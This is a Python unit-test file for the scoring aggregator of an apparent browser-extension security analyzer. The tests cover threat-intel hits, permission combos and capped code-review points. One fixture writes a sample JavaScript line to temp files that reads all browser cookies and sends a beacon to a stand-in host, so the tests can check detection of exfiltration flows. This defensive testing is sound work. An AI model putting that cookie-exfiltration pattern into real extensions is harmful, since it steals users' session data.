"""
Unit tests: scoring/aggregator.py
- Risk score calculation
- TI shortcircuit (any confirmed TI hit forces minimum HIGH)
- Combo points
- No double-counting of <all_urls>
"""
import pytest
from extanalyze.core.manifest_parser import ExtensionManifest
from extanalyze.analysis.permissions import analyze, HostScopeAssessment, PermissionAnalysis
from extanalyze.intel.tpci import TPCIResult
from extanalyze.intel.sentry import SentryResult
from extanalyze.core.store_meta import LivenessResult
from extanalyze.scoring.aggregator import aggregate, RiskReport


def _clean_tpci(ext_id="test"):
    return TPCIResult(
        hit=False, ext_id=ext_id, name="", browser="", threat_types=[],
        still_active="unknown", confirm_mal=0, ownership_transfer=False,
        notes="", source_url="", article_url="", tpci_behavioral="unknown",
        crx_sha256="", date_added="",
    )


def _clean_sentry(ext_id="test"):
    return SentryResult(
        hit=False, ext_id=ext_id, name="", reason="", source="",
        date_added="", blocklist=False, store="", version="", sha256="",
        sha256_match=None,
    )


def _clean_liveness():
    return LivenessResult(
        google_malware_confirmed=False,
        store_likely_removed=False,
        status_xml="ok",
        raw_response="",
    )


def _make_manifest(**overrides):
    defaults = dict(
        manifest_version=3, name="T", version="1", description="",
        permissions=[], optional_permissions=[],
        host_permissions=[], optional_host_permissions=[],
        content_scripts=[], content_scripts_all_urls=False,
        background_scripts=[], background_page="", background_service_worker="",
        background_persistent=None, content_security_policy="", has_unsafe_eval=False,
        update_url="", update_url_non_google=False, web_accessible_resources=[],
        externally_connectable={}, oauth2={}, raw={},
    )
    defaults.update(overrides)
    return ExtensionManifest(**defaults)


def _empty_pa():
    return PermissionAnalysis(
        permissions=[], host_permissions=[], has_all_urls=False,
        host_scope=HostScopeAssessment(False, 0, [], "NONE", ""),
        total_risk_score=0, has_critical=False, has_high=False,
        combo_hits=[], necessity_verdicts=[], category="UNKNOWN",
        category_confidence="UNKNOWN",
    )


class TestAggregateClean:
    def test_all_clean_is_safe(self):
        report = aggregate(_clean_tpci(), _clean_sentry(), _clean_liveness(), _empty_pa())
        assert report.level == "SAFE"
        assert report.score == 0
        assert report.ti_confirmed_malicious is False

    def test_clean_with_critical_combo_raises_score(self):
        m = _make_manifest(permissions=["tabs", "webRequest"], host_permissions=["<all_urls>"])
        pa = analyze(m)
        report = aggregate(_clean_tpci(), _clean_sentry(), _clean_liveness(), pa)
        # COMBO_001 = +40, should be HIGH minimum
        assert report.score >= 40
        assert report.level in ("HIGH", "CRITICAL")


class TestTIShortcircuit:
    def test_tpci_confirm_mal_3_raises_to_critical(self):
        tpci = TPCIResult(
            hit=True, ext_id="x", name="Malware", browser="chrome",
            threat_types=["spyware"], still_active=True, confirm_mal=3,
            ownership_transfer=False, notes="evil", source_url="", article_url="",
            tpci_behavioral="malicious", crx_sha256="", date_added="",
        )
        report = aggregate(tpci, _clean_sentry(), _clean_liveness(), _empty_pa())
        assert report.level == "CRITICAL"
        assert report.ti_confirmed_malicious is True
        assert report.score >= 80

    def test_tpci_confirm_mal_1_is_high(self):
        tpci = TPCIResult(
            hit=True, ext_id="x", name="Suspicious", browser="chrome",
            threat_types=["adware"], still_active=False, confirm_mal=1,
            ownership_transfer=False, notes="", source_url="", article_url="",
            tpci_behavioral="unknown", crx_sha256="", date_added="",
        )
        report = aggregate(tpci, _clean_sentry(), _clean_liveness(), _empty_pa())
        assert report.ti_confirmed_malicious is True
        assert report.level in ("HIGH", "CRITICAL")  # shortcircuit enforces minimum HIGH

    def test_google_malware_flag_confirmed(self):
        liveness = LivenessResult(
            google_malware_confirmed=True,
            store_likely_removed=False,
            status_xml="ok",
            raw_response="",
        )
        report = aggregate(_clean_tpci(), _clean_sentry(), liveness, _empty_pa())
        assert report.google_malware is True
        assert report.ti_confirmed_malicious is True
        assert report.level in ("HIGH", "CRITICAL")

    def test_sentry_blocklist_hit_is_high(self):
        sentry = SentryResult(
            hit=True, ext_id="x", name="Bad", reason="Malware",
            source="", date_added="", blocklist=True, store="Chrome",
            version="1.0", sha256="abc", sha256_match=None,
        )
        report = aggregate(_clean_tpci(), sentry, _clean_liveness(), _empty_pa())
        assert report.ti_confirmed_malicious is True
        assert report.level in ("HIGH", "CRITICAL")


class TestAllUrlsDoubleCount:
    def test_all_urls_not_double_counted(self):
        """<all_urls> as host_perm only should add score once, not twice."""
        m_with = _make_manifest(host_permissions=["<all_urls>"])
        m_without = _make_manifest()
        pa_with = analyze(m_with)
        pa_without = analyze(m_without)

        r_with = aggregate(_clean_tpci(), _clean_sentry(), _clean_liveness(), pa_with)
        r_without = aggregate(_clean_tpci(), _clean_sentry(), _clean_liveness(), pa_without)

        diff = r_with.score - r_without.score
        # <all_urls> alone should add exactly 8 points (the HOST permission score)
        # not 16 (double-counted). Allow ±5 for combo scoring.
        assert 4 <= diff <= 16, f"Unexpected score diff for <all_urls>: {diff}"


class TestOwnershipTransfer:
    def test_ownership_transfer_adds_score(self):
        tpci_no_xfer = TPCIResult(
            hit=True, ext_id="x", name="", browser="chrome", threat_types=[],
            still_active=False, confirm_mal=1, ownership_transfer=False,
            notes="", source_url="", article_url="", tpci_behavioral="unknown",
            crx_sha256="", date_added="",
        )
        tpci_xfer = TPCIResult(
            hit=True, ext_id="x", name="", browser="chrome", threat_types=[],
            still_active=False, confirm_mal=1, ownership_transfer=True,
            notes="", source_url="", article_url="", tpci_behavioral="unknown",
            crx_sha256="", date_added="",
        )
        r_no = aggregate(tpci_no_xfer, _clean_sentry(), _clean_liveness(), _empty_pa())
        r_yes = aggregate(tpci_xfer, _clean_sentry(), _clean_liveness(), _empty_pa())
        assert r_yes.score > r_no.score


class TestUnexpectedPermissions:
    def test_unexpected_perms_add_score(self):
        # nativeMessaging is UNEXPECTED for ad_blocker — should generate a reason
        m = _make_manifest(permissions=["nativeMessaging"])
        pa = analyze(m, category="ad_blocker", category_confidence="HIGH")
        report = aggregate(_clean_tpci(), _clean_sentry(), _clean_liveness(), pa)
        # The reason string contains "permission(s) not expected for category"
        assert any("not expected for category" in r.lower() for r in report.reasons), (
            f"Expected an unexpected-permission reason, got: {report.reasons}"
        )


class TestCodeReviewScoring:
    def test_contribution_is_capped_and_reasoned(self, tmp_path):
        from extanalyze.analysis.code_review import review_directory
        from extanalyze.scoring.aggregator import CODE_REVIEW_CAP

        files = {}
        for i in range(10):
            (tmp_path / f"f{i}.js").write_text(
                "chrome.cookies.getAll({});navigator.sendBeacon('https://a.test');"
            )
            files[f"f{i}.js"] = None
        cr = review_directory(tmp_path, list(files))
        assert len(cr.exfil_flows) == 10

        base = aggregate(_clean_tpci(), _clean_sentry(), _clean_liveness(), _empty_pa())
        with_cr = aggregate(_clean_tpci(), _clean_sentry(), _clean_liveness(), _empty_pa(), code_review=cr)
        assert with_cr.score - base.score == CODE_REVIEW_CAP
        assert any("exfiltration flow" in r for r in with_cr.reasons)

    def test_none_code_review_is_neutral(self):
        a = aggregate(_clean_tpci(), _clean_sentry(), _clean_liveness(), _empty_pa())
        b = aggregate(_clean_tpci(), _clean_sentry(), _clean_liveness(), _empty_pa(), code_review=None)
        assert a.score == b.score

    def test_virustotal_findings_are_outside_the_cap(self):
        from extanalyze.analysis.code_review import CodeFinding, CodeReviewResult
        from extanalyze.scoring.aggregator import CODE_REVIEW_CAP

        pattern_findings = [
            CodeFinding(f"CR-X-{i}", "x", "NETWORK", "CRITICAL", "d", 1) for i in range(5)
        ]
        vt = CodeFinding("CR-DEEP-VT", "VirusTotal flags bad.test", "NETWORK", "CRITICAL", "d", 1)
        base = aggregate(_clean_tpci(), _clean_sentry(), _clean_liveness(), _empty_pa())
        cr = CodeReviewResult(pattern_findings, [], 1, [], [])
        capped = aggregate(
            _clean_tpci(), _clean_sentry(), _clean_liveness(), _empty_pa(), code_review=cr
        )
        assert capped.score - base.score == CODE_REVIEW_CAP
        cr.findings.append(vt)
        with_vt = aggregate(
            _clean_tpci(), _clean_sentry(), _clean_liveness(), _empty_pa(), code_review=cr
        )
        assert with_vt.score - capped.score == 15
        assert any("CR-DEEP-VT" in r for r in with_vt.reasons)
